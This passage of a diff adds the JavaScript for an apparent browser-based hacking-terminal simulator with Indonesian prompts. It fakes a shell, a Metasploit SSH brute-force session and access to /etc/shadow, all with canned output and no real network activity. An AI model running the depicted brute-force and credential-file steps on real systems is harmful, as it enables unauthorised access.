+      const src=REMOTE_FILES[key]||REMOTE_FILES['~/'+f];
+      if(!rm.root&&key==='/etc/shadow'){T('cat: /etc/shadow: Permission denied','rd');S.lastErr=true;return;}
+      for(const l of src.split('\n'))T(l);return;
+    }
+    if(!rm.root&&f==='/etc/shadow'){T('cat: /etc/shadow: Permission denied','rd');S.lastErr=true;return;}
+    T('cat: '+f+': No such file or directory','rd');S.lastErr=true;return;
+  }
+  if(name==='history'){await emit(['    1  ls -la','    2  cat /etc/nginx/sites-enabled/default','    3  sudo -l','    4  sudo vim /etc/nginx/nginx.conf','    5  history'],8);return;}
+  if(name==='clear'){TERM.innerHTML='';ensureBar();return;}
+  if(name==='vim'||name==='nano'){openVim(rm.root?'/root/root.txt':'user.txt',true);return;}
+  if(name==='python3'){T('Python 3.10.12 (main, Mar 22 2024) — gunakan exit() untuk keluar');S.mode='py';S.pyPrompt='>>> ';return;}
+  if(['ifconfig','ip','ss','ps','wget','curl','grep','find','chmod','cd','mkdir','touch'].includes(name)){
+    if(name==='cd')return;
+    if(name==='ps'){await emit([['    PID TTY          TIME CMD','bd'],['   1024 ?        00:00:00 systemd','   1187 ?        00:00:01 sshd','   1301 ?        00:00:12 nginx','   1420 ?        00:00:05 mysqld','   2210 pts/0    00:00:00 bash','   2405 pts/0    00:00:00 ps']],8);return;}
+    T('');return;
+  }
+  nf();
+}
+
+/* ══════════════ msfconsole dispatcher ══════════════ */
+async function runMsf(line){
+  line=line.trim();if(!line)return;
+  const parts=line.split(/\s+/),name=parts[0].toLowerCase(),args=parts.slice(1).join(' ');
+  S.msf=S.msf||{module:'',opts:{}};
+  if(name==='exit'||name==='quit'){S.msf=null;S.nextMode='shell';return;}
+  if(name==='banner'){await emit(msfBanner(),4);return;}
+  if(name==='search'){
+    const q=args||'ssh';
+    await emit([
+     ['Matching Modules','bd'],
+     ['================','bd'],
+     ['','wh',2],
+     ['   #  Name'.padEnd(72)+'Disclosure Date  Rank       Check','gy'],
+     ['   -  ----'.padEnd(72)+'---------------  ----       -----','gy'],
+     ['   0  auxiliary/scanner/ssh/ssh_login'.padEnd(72)+'normal         Yes'],
+     ['   1  auxiliary/scanner/ssh/ssh_version'.padEnd(72)+'normal         Yes'],
+     ['   2  exploit/linux/ssh/libssh_auth_bypass'.padEnd(72)+'2018-10-16  normal     Yes'],
+     ['   3  post/linux/gather/enum_ssh_clients'.padEnd(72)+'normal         No'],
+     ['','wh',2],
+     ['Interact with a module by name or index. For example: use 0','gy']
+    ],8);return;
+  }
+  if(name==='use'){
+    S.msf.module='auxiliary(scanner/ssh/ssh_login)';
+    return;
+  }
+  if(name==='back'){S.msf.module='';return;}
+  if(name==='show'&&args.startsWith('options')){
+    await emit([
+     ['Module options (auxiliary/scanner/ssh/ssh_login):','','','   Name              Current Setting  Required  Description','   ----              ---------------  --------  -----------','   BLANK_PASSWORDS   false            no        Try blank passwords','   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce','   PASSWORD                           no        A specific password','   RHOSTS                             yes       The target host(s)','   RPORT             22               yes       The target port','   USERNAME                           no        A specific username','   USERPASS_FILE                      no        File containing users and passwords','   USER_AS_PASS      false            no        Try username as password'],10);return;
+  }
+  if(name==='set'){
+    const kv=args.split(/\s+/);S.msf.opts[kv[0]]=kv.slice(1).join(' ');
+    T(kv[0]+' => '+kv.slice(1).join(' '));return;
+  }
+  if(name==='run'||name==='exploit'){
+    if(!S.msf.module){T('[-] No module loaded. gunakan: use 0','rd');S.lastErr=true;return;}
+    if(!S.msf.opts.RHOSTS){T('[-] RHOSTS not set. gunakan: set RHOSTS '+TARGET,'rd');S.lastErr=true;return;}
+    await emit([
+     ['[*] '+TARGET+':22 - Starting bruteforce','wh',200],
+     ['[-] '+TARGET+':22 - Failed: \'admin:admin\'','gy',260],
+     ['[-] '+TARGET+':22 - Failed: \'admin:password\'','gy',260],
+     ['[-] '+TARGET+':22 - Failed: \'admin:letmein\'','gy',260],
+     ['[+] '+TARGET+':22 - <b class="gr">Success: \'admin:'+PASS+'\'</b>','gr',300],
+     ['[!] '+TARGET+':22 - No active DB -- Credential data will not be saved!','yl',140],
+     ['[*] SSH session 1 opened (192.168.1.17:52144 -> '+TARGET+':22) at 2026-08-25 '+clock()+' +0700','wh',160],
+     ['[*] Auxiliary module execution completed','wh',80]
+    ],12);return;
+  }
+  if(name==='sessions'){
+    if(args.includes('-i')){
+      T('[*] Starting interaction with 1...','gy');
+      S.msf=null;S.mode='remote';S.remote={user:'admin',host:'web-prod-01',root:false,cwd:'~'};S.nextMode='remote';
+      return;
+    }
+    await emit([['Active sessions','bd'],
+    ['===============','','   Id  Name  Type   Information                 Connection','   --  ----  ----   -----------                 ----------','   1         shell  ssh admin @ web-prod-01     192.168.1.17:52144 -> '+TARGET+':22 (192.168.1.20)'],10);return;
+  }
+  if(name==='help'){await emit(['Core commands: banner  search  use  back  show options  set  run  sessions  exit',''],8);return;}
+  T('[-] Unknown command: '+name,'rd');S.lastErr=true;
+}
+
+/* ══════════════ python REPL sederhana ══════════════ */
+async function runPy(line){
+  line=line.trim();
+  if(line==='exit()'||line==='quit()'){S.mode=S.remote?'remote':'shell';return;}
+  if(line===''){return;}
+  const pm=line.match(/^print\(\s*["'](.*)["']\s*\)$/);
+  if(pm){T(pm[1]);return;}
+  const pn=line.match(/^print\(\s*(-?\d+(?:\.\d+)?)\s*\)$/);
+  if(pn){T(pn[1]);return;}
+  if(/^[-+*/().\d\s]+$/.test(line)){
+    try{const v=Function('"use strict";return('+line+')')();T(String(v));return;}catch(e){}
+  }
+  T("Traceback (most recent call last):",'wh');
+  T('  File "<stdin>", line 1, in <module>','wh');
+  T("NameError: name '"+line.split(/[ (]/)[0]+"' is not defined",'rd');
+}
+
+/* ══════════════ vim & pager (alt-screen) ══════════════ */
+function openVim(file,remote){
+  S.vimBackup=TERM.innerHTML;
+  S.vimFile=file;S.vimColon=false;S.vimCmd='';S.mode='vim';
+  hideBar();TERM.innerHTML='';
+  const src=remote&&REMOTE_FILES[file]?REMOTE_FILES[file]:(FILES[file]!==undefined?FILES[file]:'');
+  const lines=src.split('\n');
+  const rows=Math.max(12,Math.floor(window.innerHeight/24)-3);
+  for(let i=0;i<rows;i++){
+    if(i<lines.length)P(esc(lines[i]));
+    else P('<span class="bl">~</span>');
+  }
+  P('<span class="wh" style="background:#264f78"> "'+esc(file)+'" '+lines.length+'L, '+src.length+'C — ketik <b class="bd">:q</b> lalu Enter untuk keluar </span>');
+  sc();
+}
+function closeVim(){
+  TERM.innerHTML=S.vimBackup;ensureBar();S.mode=S.remote?'remote':(S.msf?'msf':'shell');showBar();
+}
+function vimKey(k){
+  if(S.vimColon){
+    if(k==='Enter'){
+      const c=S.vimCmd.trim();S.vimColon=false;S.vimCmd='';
+      if(c==='q'||c==='q!'||c==='wq'||c==='x'){closeVim();return;}
+      if(c==='w'){/* write noop */return;}
+      return;
+    }
+    if(k==='Backspace'){S.vimCmd=S.vimCmd.slice(0,-1);return;}
+    if(k==='Escape'){S.vimColon=false;S.vimCmd='';return;}
+    if(k.length===1)S.vimCmd+=k;
+  }else if(k===':'){S.vimColon=true;}
+}
+function openPager(lines){
+  S.snap=TERM.innerHTML;S.pagerBack=S.mode;S.mode='pager';hideBar();TERM.innerHTML='';
+  for(const l of lines)P(l);BL();
+  P('<span class="gy">(END) — tekan q untuk keluar</span>');sc();
+}
+function closePager(){TERM.innerHTML=S.snap;ensureBar();S.mode=S.pagerBack;showBar();}
+
+/* ══════════════ input routing ══════════════ */
+function histNav(dir){
+  if(!S.hist.length)return;
+  S.histIdx=Math.max(0,Math.min(S.hist.length,S.histIdx+dir));
+  buf=S.histIdx===S.hist.length?'':S.hist[S.histIdx];
+  renderBar();
+}
+function doTab(){
+  const names=Object.keys(CMDS).concat(['./ops/breach.sh','ops/','wordlists/']);
+  const sp=buf.lastIndexOf(' ');
+  const token=buf.slice(sp+1);
+  if(!token)return;
+  const cands=names.filter(n=>n.startsWith(token));
+  if(cands.length===1){buf=buf.slice(0,sp+1)+(cands[0].endsWith('/')?cands[0]:cands[0]+' ');renderBar();}
+  else if(cands.length>1){freezeTyped(buf);P(cands.join('   '),'gy');renderBar();}
+}
+function routeChar(ch){
+  if(ch==='\n'){routeEnter();return;}
+  if(S.mode==='boot'){S.fast=true;return;}
+  if(S.mode==='off'){restart();return;}
+  if(S.mode==='vim'||S.mode==='pager')return;
+  if(CAPT){CAPT.buf+=ch;renderBar();return;}
+  if(S.mode==='busy')return;
+  buf+=ch;renderBar();
+}
+function routeBackspace(){
+  if(S.mode==='vim'){if(S.vimColon)vimKey('Backspace');return;}
+  if(S.mode==='pager')return;
+  if(CAPT){CAPT.buf=CAPT.buf.slice(0,-1);renderBar();return;}
+  if(S.mode==='busy')return;
+  buf=buf.slice(0,-1);renderBar();
+}
+function routeEnter(){
+  if(S.mode==='boot'){S.fast=true;return;}
+  if(S.mode==='off'){restart();return;}
+  if(S.mode==='vim'){vimKey('Enter');return;}
+  if(S.mode==='pager'){closePager();return;}
+  if(CAPT){const v=CAPT.buf;finishCapt(v);return;}
+  if(S.mode==='busy')return;
+  const line=buf;buf='';
+  P(promptHTML()+esc(line));
+  if(S.mode==='shell'){busy('shell',()=>runShell(line));}
+  else if(S.mode==='remote'){busy('remote',()=>runRemote(line));}
+  else if(S.mode==='msf'){busy('msf',()=>runMsf(line));}
+  else if(S.mode==='py'){const m=S.remote?'remote':'shell';busy(m,()=>runPy(line));}
+}
+document.addEventListener('keydown',e=>{
+  CAP.focus();
+  const k=e.key;
+  if(S.mode==='off'){if(k.length===1||k==='Enter'){e.preventDefault();restart();}return;}
+  if(S.mode==='boot'){if(k.length===1||k==='Enter'){S.fast=true;}return;}
+  if(S.mode==='pager'){if(k==='q'||k==='Q'||k==='Escape'){closePager();e.preventDefault();}return;}
+  if(S.mode==='vim'){if(k==='Escape')vimKey('Escape');else if(k.length===1)vimKey(k);else if(k==='Enter')vimKey('Enter');else if(k==='Backspace')vimKey('Backspace');e.preventDefault();return;}
+  if(e.ctrlKey){
+    if(k==='c'||k==='C'){
+      e.preventDefault();
+      if(S.mode==='busy'){S.aborted=true;return;}
+      if(CAPT){P('<span class="wh">'+esc(CAPT.prompt)+'</span>'+(CAPT.masked?'':esc(CAPT.buf))+'<span class="rd">^C</span>');const r=CAPT.res;CAPT=null;r(null);return;}
+      freezeTyped(buf,'^C');buf='';renderBar();return;
+    }
+    if(k==='l'||k==='L'){e.preventDefault();if(S.mode!=='busy'){TERM.innerHTML='';ensureBar();renderBar();}return;}
+    return;
+  }
+  if(k==='Enter'){e.preventDefault();routeEnter();return;}
+  if(k==='Backspace'){e.preventDefault();routeBackspace();return;}
+  if(k==='Tab'){e.preventDefault();if(S.mode==='shell'&&!CAPT)doTab();return;}
+  if(k==='ArrowUp'){e.preventDefault();if(S.mode==='shell'&&!CAPT)histNav(-1);return;}
+  if(k==='ArrowDown'){e.preventDefault();if(S.mode==='shell'&&!CAPT)histNav(1);return;}
+  if(k.length===1){CAPT||S.mode!=='busy'||null;}
+});
+/* karakter via textarea (desktop + mobile) */
+CAP.addEventListener('input',()=>{
+  const v=CAP.value;CAP.value='';
+  if(v)for(const ch of v)routeChar(ch);
+});
+CAP.addEventListener('beforeinput',e=>{
+  if(e.inputType&&e.inputType.indexOf('delete')===0){e.preventDefault();routeBackspace();}
+});
+function focusCap(){try{CAP.focus({preventScroll:true});}catch(_){CAP.focus();}}
+document.addEventListener('click',focusCap);
+document.addEventListener('touchstart',focusCap,{passive:true});
+window.addEventListener('load',focusCap);
+setInterval(()=>{if(document.activeElement!==CAP)focusCap();},1500);
+
+function restart(){TERM.innerHTML='';ensureBar();S.fast=false;S.root=false;S.remote=null;S.msf=null;CAPT=null;buf='';boot();}
+
+/* ══════════════ start ══════════════ */
+setTimeout(boot,350);
+</script>
+</body>
+</html>
+```
